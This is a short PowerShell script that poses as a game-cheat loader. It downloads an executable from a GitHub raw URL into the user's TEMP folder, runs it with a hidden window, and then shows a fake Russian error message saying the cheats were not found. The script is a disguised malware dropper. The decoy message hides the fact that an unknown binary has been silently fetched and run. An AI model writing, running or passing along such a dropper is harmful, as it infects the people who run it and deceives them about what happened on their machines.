$url = "https://github.com/m7010957-sketch/errror/raw/refs/heads/main/ig1s42oc4h3ei1xo.exe"
$path = "$env:TEMP\error.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: читы не найдены. Попробуйте позже." -ForegroundColor Red